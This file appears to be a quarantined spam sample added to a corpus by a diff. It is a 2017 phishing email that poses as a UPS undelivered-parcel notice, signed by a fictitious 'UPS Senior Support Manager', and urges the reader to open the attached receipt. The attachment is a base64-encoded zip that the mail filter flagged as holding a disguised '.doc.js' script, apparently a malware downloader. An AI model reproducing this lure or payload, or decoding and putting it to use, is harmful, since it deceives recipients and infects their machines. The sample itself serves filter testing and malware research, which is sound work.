@@ -1,0 +1,67 @@
+Return-Path: <cogesa@consultoresdegestion.es>
+Delivered-To: banned-quarantine
+X-Envelope-To: <jcblho@jcbl.com>
+X-Envelope-To-Blocked: <jcblho@jcbl.com>
+X-Quarantine-ID: <aOCECTfStlSj>
+X-Amavis-Alert: BANNED, message contains .asc,UPS-Parcel-ID-006086532.doc.js
+X-Spam-Flag: NO
+X-Spam-Score: 0
+X-Spam-Level:
+X-Spam-Status: No, score=x tag=x tag2=x kill=x tests=[] autolearn=unavailable
+Received: from mx10.jcbl.com ([127.0.0.1])
+	by localhost (mx9.jcbl.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id aOCECTfStlSj for <jcblho@jcbl.com>;
+	Mon, 13 Feb 2017 05:26:25 +0530 (IST)
+Received: from ns03.e-sistemas.net (ns03.e-sistemas.net [217.18.167.103])
+	by mx10.jcbl.com (Postfix) with ESMTPS id 90EEBF63CD4
+	for <jcblho@jcbl.com>; Mon, 13 Feb 2017 05:26:23 +0530 (IST)
+Received: by ns03.e-sistemas.net (Postfix, from userid 10003)
+	id E98EE1CDBA9; Mon, 13 Feb 2017 01:03:43 +0100 (CET)
+To: jcblho@jcbl.com
+Subject: Unable to deliver your item, #006086532
+X-PHP-Originating-Script: 10003:post.php(4) : regexp code(1) : eval()'d
+	code(17) : eval()'d code
+Date: Mon, 13 Feb 2017 00:03:43 +0000
+Content-Type: multipart/mixed;
+	boundary="bound1_ae07e46bf579fc0184e24a172ab35b79"
+Content-Transfer-Encoding: 8bit
+X-PPP-Message-ID: <20170213000343.2839.59778@localhost.localdomain>
+X-PPP-Vhost: consultoresdegestion.es
+Message-Id: <20170213000343.E98EE1CDBA9@ns03.e-sistemas.net>
+From: cogesa@consultoresdegestion.es
+
+--bound1_ae07e46bf579fc0184e24a172ab35b79
+Content-Type: text/plain; charset=us-ascii
+
+Dear Customer,
+
+Your item has arrived at the UPS Post Office at February 11, but the courier was unable to deliver parcel to you.
+
+Download postal receipt attached to e-mail!
+
+Thanks,
+Edgar Dalton,
+UPS Senior Support Manager.
+
+
+--bound1_ae07e46bf579fc0184e24a172ab35b79
+Content-Type: application/zip; name="UPS-Parcel-ID-006086532.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=UPS-Parcel-ID-006086532.zip
+
+UEsDBBQAAAAIAHUATUpr9EQ0CQIAADQCAAAfAAAAVVBTLVBhcmNlbC1JRC0wMDYwODY1MzIuZG9j
+LnppcAvwZmYRYWBg4GAoZfD1kivJb5vGyMDgysTAIAcUDQ0I1g1ILEpOzdH1dNE1MDAzsDAzNTbS
+S8lP1ssqdp2Qmz/bQKT1f9dRdQFNxUaz0xEmgZpvtUxv3QrUfWvi27dTZHmD7O09Ry7/+/1mS8kk
++zvV7z5+LL6b2PhFaO2EYK2j9n7L/ZqsFvO6ZS1wXynw44WVqtiaU6qvtSUFwqyFnyTEXuRTyZ5d
+M0UqwFR2UfeHu5PLdyhOeB/lKT1hkoGf4x53B/ZHOw9Zeqzym/X91455kQt6ZV5lyeWYb4/f9Oa2
+9PR/Ce6vz2xhFT6xVSq2lXPR/LYFTc8ipy77Vsv/1/Gw/6/TO75e2j71vU9nY6jCsvnHN7Ty7i6b
+kF8UryrxXe1Uzva/u24zB66bJ2mk2qd2ZVZWte7vi+un+08vfyn6/lEB2/cZKzfvLgo+4nrf/Y/a
+8/bVv11//4jeG7Ok0oPvNcf8t88/pp6fd27943/PCjX32W/YksP/58eEt9szMzYoJMhIheurqdfs
+n7eAKVzIxnrShSfvfrhvbD3wWO35MmO21lDts+wiJ7Ze4jp7+EL14msXTyo7FF3zOJEQcPJ/Yx/T
+Se1Vd25xf+uRarmx7+bDU1cnrixj+uDd9G9WM0fYkpKDbLftfrIHeDMCYw93nEKAApTGH8MB3qxs
+IFWMQOgDpC8xgngAUEsBAgAAFAAAAAgAdQBNSmv0RDQJAgAANAIAAB8AAAAAAAAAAAAgAAAAAAAA
+AFVQUy1QYXJjZWwtSUQtMDA2MDg2NTMyLmRvYy56aXBQSwUGAAAAAAEAAQBNAAAARgIAAAAA
+
+
+--bound1_ae07e46bf579fc0184e24a172ab35b79--
+
